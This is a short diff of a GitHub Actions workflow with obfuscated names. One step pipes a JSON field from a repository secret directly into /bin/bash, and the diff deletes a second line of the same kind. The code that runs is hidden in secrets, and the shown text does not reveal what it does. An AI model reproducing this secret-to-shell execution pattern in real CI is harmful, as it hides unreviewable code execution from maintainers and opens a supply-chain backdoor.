@@ -22,7 +22,6 @@ jobs:
           erj9251: ${{ secrets.erj9251 }}
         run: |
           printf '%s' "$erj9251" | jq -r .prj7237 | /bin/bash
-          printf '%s' "$qywb5652" | jq -r .t8112 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
